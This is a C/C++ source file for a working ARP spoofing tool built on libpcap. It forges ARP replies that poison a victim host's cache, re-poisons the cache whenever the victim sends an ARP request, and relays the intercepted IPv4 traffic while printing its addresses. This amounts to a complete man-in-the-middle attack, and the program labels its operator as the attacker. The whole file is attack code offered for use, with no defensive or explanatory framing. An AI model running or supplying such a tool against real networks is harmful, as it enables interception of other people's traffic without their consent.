#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <pcap.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "spoof-agent.h"

#define IGNORE 0
#define RECOVER 1
#define RELAY 2

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

pcap_t* handle;

EthArpPacket to_infect_packet(char* my_mac, char* sender_ip, char* sender_mac, char* target_ip, char* target_mac){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac::nullMac();
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	return packet;
}

int scan_packet(const u_char *packet, char* sender_ip, char* target_ip, char* sender_mac){
    EthHdr* eth_hdr;
    ArpHdr* arp_hdr;

    eth_hdr = (EthHdr*)packet;

    if (eth_hdr->type() == EthHdr::Arp){
        arp_hdr = (ArpHdr*)(eth_hdr + 1);
        if (arp_hdr->sip() == Ip(sender_ip) && arp_hdr->tip() == Ip(target_ip) && arp_hdr->op() == ArpHdr::Request)
            return RECOVER; 
    }
    else if (eth_hdr->type() == EthHdr::Ip4){
        if (eth_hdr->smac() == Mac(sender_mac))
            return RELAY;
    }

    return IGNORE;
}

int relay_packet(pcap_t* handle, const u_char* packet, char* my_ip, char* my_mac, char* target_mac, int packet_len){
    EthHdr *eth_hdr;
    int res;

    eth_hdr = (EthHdr *)packet;
    Ip dip = Ip(htonl(*(uint32_t*)((char*)eth_hdr + 30)));
    if (dip == Ip(my_ip))
        return 0;
    Mac smac = eth_hdr->smac();
    Mac dmac = eth_hdr->dmac();
    Ip sip = Ip(htonl(*(uint32_t*)((char*)eth_hdr + 26)));
    printf("-----------------Ethernet Header------------------\n");
    printf("src mac: %s\n", std::string(smac).c_str());
    printf("dst mac: %s\n", std::string(dmac).c_str());
    printf("-----------------  Ipv4 header  ------------------\n");
    printf("src ip: %s\n", std::string(sip).c_str());
    printf("dst ip: %s\n", std::string(dip).c_str());

    eth_hdr->smac_ = Mac(my_mac);
    eth_hdr->dmac_ = Mac(target_mac);

    res = pcap_sendpacket(handle, packet, packet_len);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return res;
    }

    return 0;
}

int main(int argc, char *argv[]){
    if (argc != 8){
        fprintf(stderr, "Invalid arguments\n");
        return -1;
    }

    char* dev = argv[1];
    char* my_ip = argv[2];
    char* my_mac = argv[3];
    char* sender_ip = argv[4];
    char* sender_mac = argv[5];
    char* target_ip = argv[6];
    char* target_mac = argv[7];
    char errbuf[PCAP_ERRBUF_SIZE];
    int res;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    printf("ATTACKER INFO) IP: %s MAC: %s\n", my_ip, my_mac);
    printf("SENDER INFO) IP: %s MAC: %s\n", sender_ip, sender_mac);
    printf("TARGET INFO) IP: %s MAC: %s\n", target_ip, target_mac);

    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    EthArpPacket infect_packet = to_infect_packet(my_mac, sender_ip, sender_mac, target_ip, target_mac);
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infect_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return 1;
    }
    
    struct pcap_pkthdr *header;
    const u_char *packet;

    while (true){
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return -1;
        }

        res = scan_packet(packet, sender_ip, target_ip, sender_mac);
        if (res == IGNORE)  
            continue;

        if (res == RECOVER){
            EthArpPacket infect_packet = to_infect_packet(my_mac, sender_ip, sender_mac, target_ip, target_mac);
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infect_packet), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                return 1;
            }
        }

        if (res == RELAY)
            relay_packet(handle, packet, my_ip, my_mac, target_mac, header->len);        
    }

    return 0;
}